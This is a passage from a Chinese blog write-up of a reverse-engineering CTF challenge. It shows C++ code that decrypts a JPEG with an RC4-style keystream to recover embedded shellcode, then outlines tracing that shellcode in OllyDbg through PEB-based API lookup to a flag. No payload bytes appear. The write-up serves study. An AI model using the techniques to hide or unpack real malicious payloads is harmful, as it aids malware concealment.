class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp,*dump;</span><br><span class="line">    fp =fopen(&quot;x.jpg&quot;,&quot;rb&quot;);</span><br><span class="line">    dump = fopen(&quot;shell.txt&quot;,&quot;wb&quot;);</span><br><span class="line"> </span><br><span class="line">    fseek(fp,0,SEEK_END);</span><br><span class="line">    int file_len = ftell(fp);//文件的长度</span><br><span class="line">    fseek(fp,0,SEEK_SET);</span><br><span class="line">    cout&lt;&lt;file_len&lt;&lt;endl;</span><br><span class="line">    char file[file_len];</span><br><span class="line">    fread(file,file_len,1,fp);</span><br><span class="line">   fclose(fp);</span><br><span class="line">    unsigned char key[264];</span><br><span class="line">    long long first = 0x4A8754F5745174;</span><br><span class="line"> </span><br><span class="line">    for(int i=0;i&lt;8;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key[i] = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    for(int i=0;i&lt;256;i++)</span><br><span class="line">        key[i+8] = ((i + (first &gt;&gt;(i % 8 * 8)))&amp;0xff);//运算符的优先级</span><br><span class="line">    int len = 264;</span><br><span class="line">    int dkey[len/4];</span><br><span class="line"> </span><br><span class="line">    int temp;</span><br><span class="line">    unsigned char temp4,temp5;</span><br><span class="line"> </span><br><span class="line">    for(int i=0;i&lt;len/4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = 0;</span><br><span class="line">        for(int j=3;j&gt;-1;j--)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = (temp&lt;&lt;8) + key[4 * i + j];</span><br><span class="line">        &#125;</span><br><span class="line">        dkey[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    char flag[file_len];</span><br><span class="line"> </span><br><span class="line">    for(int i=0;i&lt;file_len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dkey[0] = (dkey[0]+ 1)%256;</span><br><span class="line">        dkey[1] = (key[dkey[0] + 8] + dkey[1])%256;</span><br><span class="line">        temp4 = key[dkey[0] + 8];</span><br><span class="line">        temp5 = key[dkey[1] + 8];</span><br><span class="line">        key[dkey[0] + 8] = temp5;</span><br><span class="line">        key[dkey[1] + 8] = temp4;</span><br><span class="line">       flag[i] = (key[(temp4 + temp5 )%256 + 8] ^ file[i] ^ i)%256;</span><br><span class="line">       fputc(flag[i],dump);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(dump);</span><br><span class="line">/*</span><br><span class="line">    for(int i=file_len-1;i&gt;=4;i --)</span><br><span class="line">    &#123;</span><br><span class="line">        if(flag[i]==0x68)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;%c%c%c%c&quot;,flag[i-4],flag[i-3],flag[i-2],flag[i-1]);</span><br><span class="line">            i -= 4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">*/</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以用16进制编辑器打开得到的文件</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\9.png" alt=""></p>
<p>可以看到很多字符，但好像是无序的；查看大佬的WP知道这是shellcode（惊）。</p>
<p>自己在OD找段空白，copy进去：</p>
<p>啊哈哈，刚好最近看书看到这段类似的代码实现；</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\10.png" alt=""></p>
<p>PEB-&gt; PEB_LAR_DATA-&gt; InInitalizationOrderMouduleList-&gt;DLL-&gt;API</p>
<p>继续往下看；</p>
<p>push一段字符串</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\11.png" alt=""></p>
<h2 id="注意小端序，即可得到了flag"><a href="#注意小端序，即可得到了flag" class="headerlink" title="注意小端序，即可得到了flag."></a>注意小端序，即可得到了flag.</h2><p>作者：还木人<br>来源：CSDN<br>原文：<a href="https://blog.csdn.net/caobo_lq666/article/details/83211242" target="_blank" rel="noopener">https://blog.csdn.net/caobo_lq666/article/details/83211242</a><br>版权声明：本文为博主原创文章，转载请附上博文链接！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/一次手动脱壳/" data-id="cjorg7grc0006t0tv5ug7eu89" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li></ul>

    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/acm-算法/">acm 算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Security/" style="font-size: 10px;">Security</a> <a href="/tags/acm-算法/" style="font-size: 15px;">acm 算法</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/reverse/" style="font-size: 20px;">reverse</a> <a href="/tags/算法/" style="font-size: 15px;">算法</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/11/22/Mini-Horse/">Mini_Horse</a>
          </li>
        
          <li>
            <a href="/2018/11/21/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2018/11/21/M的硬盘/">M的硬盘</a>
          </li>
        
          <li>
            <a href="/2018/11/21/PE--导入导出表/">PE 导入导出表</a>
          </li>
        
          <li>
            <a href="/2018/11/21/ROP专项总结/">ROP专项总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 treebacker<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>